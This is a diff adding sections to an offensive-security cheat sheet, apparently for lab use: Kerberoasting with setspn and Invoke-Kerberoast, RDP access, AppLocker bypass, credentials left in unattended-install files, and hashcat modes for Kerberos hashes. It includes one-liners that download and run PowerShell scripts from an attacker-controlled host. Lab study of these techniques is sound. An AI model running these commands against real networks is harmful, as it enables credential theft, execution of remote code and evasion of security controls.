@@ -17,6 +17,7 @@
   - [Windows Meterpreter EXE Payload](#windows-meterpreter-exe-payload)
 - [Remote Access](#remote-access)
   - [Windows Remote Management (WinRM)](#windows-remote-management-winrm)
+  - [Remote Desktop (xfreerdp)](#remote-desktop-xfreerdp)
   - [Meterpreter Session Basics](#meterpreter-session-basics)
 - [Privilege Escalation](#privilege-escalation)
   - [Linux](#linux)
@@ -31,6 +32,8 @@
     - [Msfvenom Service Executable and Restart](#msfvenom-service-executable-and-restart)
     - [Token Impersonation (Incognito)](#token-impersonation-incognito)
     - [Potato Attacks](#potato-attacks)
+    - [AppLocker bypass](#applocker-bypass)
+    - [Unattended installation files](#unattended-installation-files)
     - [Windows Privilege Escalation Checklist](#windows-privilege-escalation-checklist)
 - [Password Cracking](#password-cracking)
   - [John the Ripper](#john-the-ripper)
@@ -268,6 +271,26 @@ GetNPUsers.py <domain>/ -no-pass -usersfile <users.txt> -dc-ip <target>
 * **No credentials required** - works with anonymous/null session access
 * Output format: `$krb5asrep$23$username@DOMAIN:hash` (can be cracked with hashcat mode 18200 or john)
 * Example: `GetNPUsers.py thm.corp/ -no-pass -usersfile users.txt -dc-ip 10.82.151.31`
+
+* **Kerberoasting (TGS) — from a domain session** - Any authenticated domain user can request Kerberos **service tickets (TGS)** for accounts that have **SPNs**. The ticket material can be cracked offline to recover the service account password.
+
+* **Enumerate SPNs (Windows, built-in)** — On a domain-joined host:
+
+```cmd
+setspn -T <domain> -Q */*
+```
+
+* `-T <domain>`: DNS-style domain name (e.g. `corp`, `thm.local`)
+* `-Q */*`: Query mode listing registered SPNs (useful for finding roastable accounts)
+
+* **Request hashes with Invoke-Kerberoast (PowerShell)** — Host `Invoke-Kerberoast.ps1` over HTTP on your attacking machine, then run on the target (replace `<KALI_IP>` with your VPN address, e.g. `tun0`):
+
+```powershell
+powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash"
+```
+
+* Output lines start with `$krb5tgs$23$...` — crack with **hashcat mode 13100** (see [Hashcat](#hashcat)).
+* **Contrast with AS-REP roasting**: Kerberoasting needs **some domain credentials / session**; AS-REP roasting targets accounts **without** pre-auth and may work without credentials.
 
 * **Reset User Password and Enable Account (PowerShell)** - Resets a user's password and enables their account in Active Directory
 
@@ -545,6 +568,20 @@ evil-winrm -i <target> -u <username> -p '<password>'
   * `Invoke-Binary`: Execute uploaded binaries
 * Example: `evil-winrm -i 10.10.161.74 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!'`
 
+### Remote Desktop (xfreerdp)
+
+* **RDP from Linux** — Graphical desktop session (common in labs; port **3389/tcp**).
+
+```bash
+xfreerdp /u:<username> /p:'<password>' /v:<target> /dynamic-resolution +clipboard
+```
+
+* **Domain accounts** — Escape the backslash for the shell: `corp\\dark` not `corp\dark`.
+* `/dynamic-resolution`: Resize the session with the window.
+* `+clipboard`: Share clipboard (paste commands from the attacking machine).
+* Non-default port: `/v:<target>:3389` or `/port:<n>` depending on `xfreerdp` version.
+* Wrap passwords that contain shell metacharacters (`$`, `` ` ``, `!`, etc.) in **single quotes** on Linux.
+
 ### Meterpreter Session Basics
 
 * **Upload / download** - Transfer files between your machine and the target
@@ -752,6 +789,14 @@ Invoke-AllChecks
 * `. .\PowerUp.ps1`: Leading dot + space = dot-source (loads script into the current session)
 * `Invoke-AllChecks`: Runs PowerUp’s checks and prints findings (weak services, unquoted paths, writable paths, etc.)
 
+* **Load from attacker URL (in-memory)** — When you cannot save `PowerUp.ps1` locally or prefer not to touch disk:
+
+```powershell
+powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/PowerUp.ps1'); Invoke-AllChecks"
+```
+
+Serve the script from the same host/IP the target can reach (often your VPN interface, e.g. `tun0`). Use plain **HTTP** if you use `python3 -m http.server` without TLS.
+
 #### Interpreting PowerUp Output
 
 * **Example** (vulnerable service — unquoted path + modifiable component):
@@ -829,18 +874,49 @@ getuid
   4. Catch elevated shell/token and verify with `whoami`
 * Choose tool based on OS/build and patch level; not every Potato variant works everywhere.
 
+#### AppLocker bypass
+
+* **Problem** — Application whitelisting may block `cmd.exe`, PowerShell from `%SystemRoot%\System32\WindowsPowerShell\...`, the Start menu, and other launch paths.
+* **Common lab technique** — Open **File Explorer**, click the **address bar** (path bar), type `powershell`, press **Enter**. Explorer may spawn PowerShell in a context that is still allowed.
+* **Another frequent exception path** (depends on policy): `C:\Windows\System32\spool\drivers\color` — courses often use this folder for placing payloads when executable rules exclude it.
+* **Sanity check** (if cmdlet available):
+
+```powershell
+Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
+```
+
+#### Unattended installation files
+
+* **What** — OEM / unattended Windows setups may leave **credentials or encoded secrets** on disk (`Unattended.xml`, `AutoUnattend.xml`).
+* **Where to look**:
+
+```text
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\Panther\Unattend.xml
+```
+
+Also check other deployment paths noted by **PowerUp** under **UnattendPath** (`Invoke-AllChecks`).
+* **What to grep for** — `<Password>`, `<AdministratorPassword>`, `<AutoLogon>`, `<Value>` (often **Base64**).
+* **Decode Base64 on Linux**:
+
+```bash
+echo '<BASE64_STRING>' | base64 -d
+```
+
 #### Windows Privilege Escalation Checklist
 
 ```text
 whoami /priv          -> SeImpersonatePrivilege? -> Token impersonation / Potato
-winPEAS / PowerUp     -> service misconfig, unquoted paths, weak perms
+winPEAS / PowerUp     -> service misconfig, unquoted paths, weak perms, UnattendPath
 sc qc <service>       -> inspect binary path, start account, startup type
 accesschk / icacls    -> weak service/binary/folder permissions
+type Unattended.xml   -> leftover setup credentials (Panther)
 ```
 
 * Fast decision flow:
   * `SeImpersonatePrivilege` present -> test Incognito/Potato first
   * Weak service config/ACL found -> service binary/path abuse
+  * **PowerUp** reports **UnattendPath** -> read XML / decode Base64
   * Always verify context after each step with `whoami` and `whoami /groups`
 
 ---
@@ -886,6 +962,20 @@ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.
 * `-a 0`: Straight attack mode (wordlist)
 * `-m 0`: Raw MD5 hash mode
 * `--show`: Displays cracked result(s) from hashcat potfile
+
+* **Kerberos 5 TGS-REP (Kerberoasting)** — Hash lines start with `$krb5tgs$23$...`
+
+```bash
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+* **Kerberos 5 AS-REP** — Hash lines start with `$krb5asrep$23$...` (see [AS-REP Roasting](#active-directory))
+
+```bash
+hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+* One hash per line in `hashes.txt`; use `--show` after a run to print cracked passwords from the potfile.
 
 ### Unshadow
 
